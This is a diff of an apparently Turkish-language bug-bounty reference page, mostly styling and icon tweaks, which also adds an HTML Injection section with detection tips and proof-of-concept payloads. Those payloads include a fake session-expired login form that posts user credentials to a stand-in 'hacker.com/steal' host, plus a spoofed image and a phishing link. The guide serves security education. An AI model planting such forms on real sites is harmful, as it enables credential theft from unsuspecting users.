@@ -6,7 +6,13 @@
   <link rel="apple-touch-icon" href="https://sourcecodered.com/wp-content/uploads/2024/07/bug-bounty-circle-general-logo.png">
     <style>
       :root{--bg:#0f1724;--card:#0b1220;--muted:#9aa4b2;--accent:#06b6d4;--glass: rgba(255,255,255,0.03);}
-      html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial; background:linear-gradient(180deg,#071021 0%, #071726 100%);color:#e6eef6}
+      html,body{
+          height:100%;
+          margin:0;
+          font-family:Inter,ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial;
+          background-color: #071021;
+          color:#e6eef6
+      }      
       .wrap{display:grid;grid-template-columns:260px 1fr;gap:20px;min-height:100vh;padding:28px}
       .sidebar{background:var(--card);border-radius:12px;padding:18px;box-shadow:0 6px 24px rgba(2,6,23,0.6)}
       .nav{display:flex;flex-direction:column;gap:6px}
@@ -880,7 +886,7 @@ POST /api/v1/user/update/B456
 
         bac: {
           menuName: 'BAC',
-          icon: 'icon-lock-open',
+          icon: 'icon-folder-tree',
           parent: 'vulnerabilities',
           title: 'BAC - Broken Access Control',
           description: 'Sunucu tarafında yeterli yetkilendirme/erişim kontrolü yapılmaması sonucu yetkisiz erişim veya işlem yapılabilmesine sebep olan güvenlik açığı sınıfı.',
@@ -1730,7 +1736,65 @@ Host: target.com</pre>
         }
     ]
 },
-
+html_injection: {
+    menuName: 'HTML Injection',
+    icon: 'icon-refresh',
+    parent: 'vulnerabilities',
+    title: 'HTML Injection (UI Redressing)',
+    description: 'Uygulamanın kullanıcıdan gelen girdiyi filtrelemeden sayfaya yansıtması sonucu arayüz manipülasyonu.',
+    sections: [
+        {
+            title: 'Tanım ve Kapsam',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Tanım:</strong> Uygulama, kullanıcının girdisine izin veriyor ancak &lt;script&gt; etiketleri gibi tehlikeli JavaScript kodlarını filtrelerken, diğer HTML etiketlerini (&lt;p&gt;, &lt;a&gt;, &lt;img&gt;, &lt;form&gt;) engellemeyi unutuyor.
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Kapsam:</strong> Reflected (Yansıyan) ve Stored (Kalıcı) XSS'in arandığı tüm input alanları (arama kutuları, yorum formları, kullanıcı profili adları).
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Kritik Etki:</strong> Sayfa içeriğini bozma (Defacement), Oturum Kimlik Avı (Phishing) ve Kullanıcı Arayüzü Manipülasyonu (UI Redressing).
+                </li>
+            </ul>`
+        },
+        {
+            title: 'Tespit ve Fingerprinting',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Hızlı Test:</strong> Girdi alanına basit bir HTML etiketi (örneğin kalın yazı) enjekte edin ve yansımasını kontrol edin.
+                    <pre>Girdi: &lt;b&gt;TEST&lt;/b&gt;</pre>
+                    <pre>Beklenen Çıktı (Zafiyet varsa): <b>TEST</b> (Kalın Yazı)</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>XSS Farkı:</strong> Eğer &lt;script&gt;alert(1)&lt;/script&gt; çalışmıyorsa (filtreliyorsa) ancak &lt;b&gt; veya &lt;a&gt; çalışıyorsa, bu bir HTML Injection zafiyetidir.
+                </li>
+            </ul>`
+        },
+        {
+            title: 'PoC Örnekleri (Phishing ve Manipülasyon)',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Görüntüleme Manipülasyonu (Image Phishing):</strong> Resmi değiştirerek kullanıcıyı yanıltma.
+                    <pre>&lt;img src="https://hacker.com/login_button.png"&gt;</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Kalıcı (Stored) Phishing Senaryosu:</strong> Bir yorum alanına sahte login formu enjekte etme.
+                    <pre>
+&lt;form action="https://hacker.com/steal" method="POST"&gt;
+    &lt;h3&gt;Oturumunuzun Süresi Doldu&lt;/h3&gt;
+    Kullanıcı Adı: &lt;input type="text" name="user"&gt;
+    Şifre: &lt;input type="password" name="pass"&gt;
+    &lt;input type="submit" value="Giriş Yap"&gt;
+&lt;/form&gt;</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong>Bağlantı Manipülasyonu:</strong> Kullanıcının tıklaması gereken bir linki, kötü amaçlı bir adrese yönlendirme.
+                    <pre>&lt;a href="https://hacker.com/redirect"&gt;ÜCRETSİZ ÖDÜL KAZAN!&lt;/a&gt;</pre>
+                </li>
+            </ul>`
+        }
+    ]
+},
 session_management: {
     menuName: 'Session Management',
     icon: 'icon-shield',
@@ -2556,7 +2620,7 @@ function renderMenu() {
     });
 
     if (vulnerabilities.length > 0) {
-        let vulnerabilitiesHtml = '<details class="accordion-menu"><summary class="icon-shield">Vulnerabilities</summary><div class="accordion-content">';
+        let vulnerabilitiesHtml = '<details class="accordion-menu"><summary class="icon-database">Vulnerabilities</summary><div class="accordion-content">';
         vulnerabilities.sort((a, b) => a.menuName.localeCompare(b.menuName)).forEach(item => {
             vulnerabilitiesHtml += `<a href="#${item.key}" class="subitem ${item.icon}" data-page="${item.key}">${item.menuName}</a>`;
         });
@@ -4025,9 +4089,9 @@ html = `
  <h1><i class="${tool.icon}"></i> ${tool.title}</h1>
  <p class="lead">${tool.description}</p>
  <div class="tool-tabs">
-  <button class="tab-button active" data-tab="tab-identifier">🔍 Tespit Et</button>
-  <button class="tab-button" data-tab="tab-encoder">⚙️ Encode / Hash</button>
-  <button class="tab-button" data-tab="tab-decoder">🛠️ Decode</button>
+  <button class="tab-button active" data-tab="tab-identifier">Tespit Et</button>
+  <button class="tab-button" data-tab="tab-encoder">Encode / Hash</button>
+  <button class="tab-button" data-tab="tab-decoder">Decode</button>
  </div>
  <div id="tab-identifier" class="tab-content active">
   <h3>Format Tespit Aracı</h3>
